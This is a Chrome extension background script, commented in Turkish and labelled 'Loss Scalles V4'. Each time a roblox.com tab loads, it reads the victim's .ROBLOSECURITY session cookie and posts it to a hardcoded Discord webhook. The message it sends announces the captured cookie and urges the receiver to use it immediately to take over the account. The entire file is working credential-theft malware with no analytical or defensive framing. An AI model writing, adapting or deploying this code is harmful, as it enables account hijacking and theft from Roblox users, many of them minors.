// ===== LOSS SCALLES V4 - BACKGROUND (COOKIE ONLY - STABLE) =====
const WEBHOOK = 'https://discord.com/api/webhooks/1515633084454932544/qVz2e7VFNp8nloVjsS_yXcdWxmAk_fAlvaV_d6-0fnD7RWyE8vJgWrkx_zffM6J4ioln';

// Global değişkenler
var sonCookie = '';
console.log('[LS V4] Background servisi başlatıldı (Cookie Only - Stable).');

// Cookie yakalama listener'ı
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    // Sadece Roblox siteleri ve yükleme aşamasında
    if (tab.url && tab.url.indexOf('roblox.com') > -1 && changeInfo.status === 'loading') {
        setTimeout(function() {
            chrome.cookies.getAll({domain: '.roblox.com'}, function(cookies) {
                if (chrome.runtime.lastError) {
                    console.error('[LS V4] Cookie erişim hatası:', chrome.runtime.lastError);
                    return;
                }
                
                for (var i = 0; i < cookies.length; i++) {
                    if (cookies[i].name === '.ROBLOSECURITY' && cookies[i].value !== sonCookie) {
                        sonCookie = cookies[i].value;
                        
                        // Cookie gönder
                        fetch(WEBHOOK, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                content: "**🍪 ROBLOX COOKIE CAPTURED!**\n\n```" + cookies[i].value + "```\n\n⚠️ **CRITICAL:** Bu cookie ile hesab ele geçirilebilir. Hemen kullanın."
                            })
                        }).catch(e => console.error('[LS V4] Webhook hatası:', e));
                        
                        console.log('[LS V4] Yeni cookie yakalandı ve gönderildi.');
                    }
                }
            });
        }, 1500);
    }
});

console.log('[LS V4] Dinleme modunda. Sadece Cookie odaklı çalışıyor.');